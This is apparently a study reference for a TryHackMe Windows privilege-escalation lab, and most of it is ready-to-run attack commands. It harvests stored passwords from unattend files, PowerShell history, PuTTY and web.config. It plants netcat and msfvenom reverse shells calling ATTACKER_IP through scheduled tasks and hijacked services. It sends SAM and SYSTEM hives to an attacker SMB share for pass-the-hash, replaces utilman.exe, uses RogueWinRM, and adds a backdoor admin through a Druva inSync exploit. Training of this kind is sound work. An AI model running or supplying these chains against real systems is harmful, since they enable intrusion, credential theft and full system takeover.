# Session 6 — Windows Privilege Escalation (Guided Lab Reference)

> Source lab: TryHackMe — *Windows Privilege Escalation* (`windowsprivesc20`)
> Starting point in every task: an **unprivileged shell** on the target (`thm-unpriv` / `Password321`).
> Goal: escalate to **Administrator / NT AUTHORITY\SYSTEM**.

**Command legend**
- 🟢 **Target** = run on the compromised Windows victim (your low-priv shell / RDP).
- 🔴 **Attacker** = run on your Kali / AttackBox.

---

## Task 2 — Privilege Escalation Concepts

**Concept.** PrivEsc = using access as *user A* to gain access as *user B* (usually Administrator/SYSTEM) by abusing a weakness. Sometimes you hop through several unprivileged accounts first.

**The four weakness classes we abuse:**
1. Misconfigured services or scheduled tasks
2. Excessive privileges on our account (`whoami /priv`)
3. Vulnerable / unpatched software
4. Missing Windows security patches

**Account tiers to know:** normal users → `Administrators` → `SYSTEM` (highest). Service accounts `LOCAL SERVICE` / `NETWORK SERVICE` / IIS `defaultapppool` are special because they often hold impersonation privileges.

---

## Task 3 — Harvesting Passwords from Usual Spots

**Concept.** Fastest win: credentials left lying around by users or software. No exploit needed — just know where to look. *All commands run on the 🟢 Target.*

### 3.1 Unattended install files
Admin credentials may be saved during automated Windows deployments.
```cmd
:: 🟢 Target — check known locations
type C:\Unattend.xml
type C:\Windows\Panther\Unattend.xml
type C:\Windows\Panther\Unattend\Unattend.xml
type C:\Windows\system32\sysprep.inf
type C:\Windows\system32\sysprep\sysprep.xml
```
Look for a `<Credentials>` block (password may be base64-encoded).

### 3.2 PowerShell history
Commands typed in PowerShell (including passwords) are logged.
```cmd
:: 🟢 Target — from cmd.exe
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
```
> From PowerShell instead, use `$Env:userprofile` (cmd's `%userprofile%` won't expand).

### 3.3 Saved Windows credentials
```cmd
:: 🟢 Target — list stored creds, then reuse them
cmdkey /list
runas /savecred /user:admin cmd.exe
```
You can't see the password, but `/savecred` reuses it to spawn a shell as that user.

### 3.4 IIS web.config (DB / auth strings)
```cmd
:: 🟢 Target
type C:\inetpub\wwwroot\web.config | findstr connectionString
type C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config | findstr connectionString
```

### 3.5 PuTTY stored proxy credentials
```cmd
:: 🟢 Target — ProxyPassword is stored in cleartext
reg query HKEY_CURRENT_USER\Software\SimonTatham\PuTTY\Sessions\ /f "Proxy" /s
```
> "SimonTatham" is PuTTY's author (part of the path), not a username.
> Same idea applies to browsers, FTP/SSH/VNC clients — anything that saves passwords.

---

## Task 4 — Other Quick Wins

### 4.1 Weak Scheduled Task binary
**Concept.** A task runs as another user; if you can overwrite the file it runs, your code runs as that user.
```cmd
:: 🟢 Target — enumerate the task and check permissions
schtasks /query /tn vulntask /fo list /v
icacls c:\tasks\schtask.bat
```
If `BUILTIN\Users` has `(F)` full access → overwrite the script with a reverse shell:
```cmd
:: 🟢 Target — plant payload (nc64.exe is provided in C:\tools)
echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat
```
```bash
# 🔴 Attacker — start listener
nc -lvp 4444
```
```cmd
:: 🟢 Target — trigger it (normally you'd wait for the schedule)
schtasks /run /tn vulntask
```
Result: reverse shell as `taskusr1`.

### 4.2 AlwaysInstallElevated
**Concept.** If both registry values are set, any `.msi` runs as SYSTEM.
```cmd
:: 🟢 Target — both must return 0x1
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer
```
```bash
# 🔴 Attacker — build malicious installer
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=LPORT -f msi -o malicious.msi
# start a Metasploit multi/handler for the same payload
```
```cmd
:: 🟢 Target — after transferring the .msi
msiexec /quiet /qn /i C:\Windows\Temp\malicious.msi
```
> Informational in this room's box (not exploitable there), but a real technique.

---

## Task 5 — Abusing Service Misconfigurations

**Enumeration idea.** A service = an executable (`BINARY_PATH_NAME`) run as a user (`SERVICE_START_NAME`) by the SCM. Inspect with `sc qc <name>`. Three separate weaknesses:

### 5.1 Insecure permissions on the service EXE
```cmd
:: 🟢 Target
sc qc WindowsScheduler
icacls C:\PROGRA~2\SYSTEM~1\WService.exe
```
If `Everyone` / `Users` has `(M)` or `(F)` on the EXE → replace it.
```bash
# 🔴 Attacker — build service payload + serve it
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4445 -f exe-service -o rev-svc.exe
python3 -m http.server
nc -lvp 4445
```
```cmd
:: 🟢 Target — pull, swap the binary, restart
wget http://ATTACKER_IP:8000/rev-svc.exe -O rev-svc.exe
move WService.exe WService.exe.bkp
move C:\Users\thm-unpriv\rev-svc.exe WService.exe
icacls WService.exe /grant Everyone:F
sc.exe stop windowsscheduler
sc.exe start windowsscheduler
```
> In PowerShell use `sc.exe` (`sc` is an alias for `Set-Content`). Result: shell as `svcusr1`.

### 5.2 Unquoted Service Path
**Concept.** A binary path with spaces and no quotes (e.g. `C:\MyPrograms\Disk Sorter Enterprise\bin\disksrs.exe`) makes the SCM try `C:\MyPrograms\Disk.exe` first. If any early folder is writable, drop your binary there.
```cmd
:: 🟢 Target — confirm unquoted path + writable folder
sc qc "disk sorter enterprise"
icacls c:\MyPrograms
```
`Users` with `(AD)`/`(WD)` = can create files → hijack point.
```bash
# 🔴 Attacker
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4446 -f exe-service -o rev-svc2.exe
nc -lvp 4446
```
```cmd
:: 🟢 Target — place payload at the hijack path, restart
move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
icacls C:\MyPrograms\Disk.exe /grant Everyone:F
sc stop "disk sorter enterprise"
sc start "disk sorter enterprise"
```
Result: shell as `svcusr2`.

### 5.3 Weak Service DACL (reconfigure the service)
**Concept.** Even with a safe EXE and quoted path, if the *service's* DACL lets you reconfigure it, point it at anything and run as any account.
```cmd
:: 🟢 Target — check service DACL (accesschk in C:\tools)
C:\tools\AccessChk\accesschk64.exe -qlc thmservice
```
`BUILTIN\Users: SERVICE_ALL_ACCESS` = you can reconfigure it.
```bash
# 🔴 Attacker
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4447 -f exe-service -o rev-svc3.exe
nc -lvp 4447
```
```cmd
:: 🟢 Target — repoint binary + account to LocalSystem, restart
icacls C:\Users\thm-unpriv\rev-svc3.exe /grant Everyone:F
sc config THMService binPath= "C:\Users\thm-unpriv\rev-svc3.exe" obj= LocalSystem
sc stop THMService
sc start THMService
```
> Mind the space after each `=`. Result: shell as **NT AUTHORITY\SYSTEM**.

---

## Task 6 — Abusing Dangerous Privileges

**Enumerate first:** `whoami /priv`. Cross-reference exploitable ones with the Priv2Admin project.

### 6.1 SeBackup / SeRestore  (read/write any file, ignoring DACLs)
**Idea.** Copy the `SAM` + `SYSTEM` hives → extract the local Administrator hash → Pass-the-Hash.
```cmd
:: 🟢 Target — login as THMBackup / CopyMaster555 (Backup Operators group)
whoami /priv
reg save hklm\system C:\Users\THMBackup\system.hive
reg save hklm\sam C:\Users\THMBackup\sam.hive
```
```bash
# 🔴 Attacker — host an SMB share to receive the hives
mkdir share
python3.9 /opt/impacket/examples/smbserver.py -smb2support -username THMBackup -password CopyMaster555 public share
```
```cmd
:: 🟢 Target — copy hives to the attacker share
copy C:\Users\THMBackup\sam.hive \\ATTACKER_IP\public\
copy C:\Users\THMBackup\system.hive \\ATTACKER_IP\public\
```
```bash
# 🔴 Attacker — dump hashes, then Pass-the-Hash to SYSTEM
python3.9 /opt/impacket/examples/secretsdump.py -sam sam.hive -system system.hive LOCAL
python3.9 /opt/impacket/examples/psexec.py -hashes <LM>:<NT> administrator@TARGET_IP
```

### 6.2 SeTakeOwnership  (take ownership of any object)
**Idea.** Take over `utilman.exe` (runs as SYSTEM from the lock screen) and replace it with `cmd.exe`. *All on 🟢 Target* (login as THMTakeOwnership / TheWorldIsMine2022):
```cmd
:: 🟢 Target
whoami /priv
takeown /f C:\Windows\System32\Utilman.exe
icacls C:\Windows\System32\Utilman.exe /grant THMTakeOwnership:F
copy C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
```
Then: **lock the screen** → click **Ease of Access** → SYSTEM cmd prompt.

### 6.3 SeImpersonate / SeAssignPrimaryToken  (impersonate other users' tokens)
**Idea.** A service holding these privileges can borrow the token of any user that authenticates to it. Force a SYSTEM auth and impersonate it (RogueWinRM / Potato family). Assume a web shell on IIS.
```cmd
:: 🟢 Target (via web shell) — confirm the privileges
whoami /priv
```
```bash
# 🔴 Attacker — catch the SYSTEM reverse shell
nc -lvp 4442
```
```cmd
:: 🟢 Target (via web shell) — trigger RogueWinRM (exploit in C:\tools)
c:\tools\RogueWinRM\RogueWinRM.exe -p "C:\tools\nc64.exe" -a "-e cmd.exe ATTACKER_IP 4442"
```
> `-p` = program to run (nc64), `-a` = its args. Can take ~2 min (waits on the BITS service). Result: **SYSTEM**.

---

## Task 7 — Abusing Vulnerable Software

**Enumerate installed software + versions, then find a public exploit.**
```cmd
:: 🟢 Target — list installed products (can take ~1 min; may miss some)
wmic product get name,version,vendor
```
Search exploit-db / packetstorm / Google for the version.

**Case study — Druva inSync 6.6.3.** Runs an RPC server on **port 6064 as SYSTEM** (localhost). Procedure #5 executes any command; a path-traversal bypasses the patch's path check → run `cmd.exe` as SYSTEM.
```powershell
# 🟢 Target — run the provided PowerShell exploit (C:\tools\Druva_inSync_exploit.txt)
# change the payload to create + elevate an admin user:
$cmd = "net user pwnd SimplePass123 /add & net localgroup administrators pwnd /add"
# (rest of the socket script talks to 127.0.0.1:6064)
```
```cmd
:: 🟢 Target — verify, then use the new admin
net user pwnd
:: run cmd as administrator using pwnd / SimplePass123, then:
type C:\Users\Administrator\Desktop\flag.txt
```

---

## Task 8 — Tools of the Trade (automated enumeration)

| Tool | Runs on | Note |
|------|---------|------|
| **WinPEAS** (`winpeas.exe > out.txt`) | 🟢 Target | Broad enum; redirect output to a file. |
| **PrivescCheck** (PowerShell) | 🟢 Target | No binary needed. `Set-ExecutionPolicy Bypass -Scope process -Force; . .\PrivescCheck.ps1; Invoke-PrivescCheck` |
| **WES-NG** (`wes.py systeminfo.txt`) | 🔴 Attacker | Feed it the target's `systeminfo` output; finds missing patches. Quieter (no upload). |
| **Metasploit** `multi/recon/local_exploit_suggester` | 🔴 Attacker | Needs an existing Meterpreter session. |

> Automated tools save time but **miss things** — always confirm manually.

---

### Key takeaways
- Always start with **enumeration**: `whoami /priv`, services (`sc qc`), scheduled tasks, installed software, and password-leak spots.
- The exploitation pattern is repetitive: **build payload (Attacker) → deliver + trigger (Target) → catch shell (Attacker)**.
- Highest-value privileges: `SeImpersonate`, `SeBackup/SeRestore`, `SeTakeOwnership`.
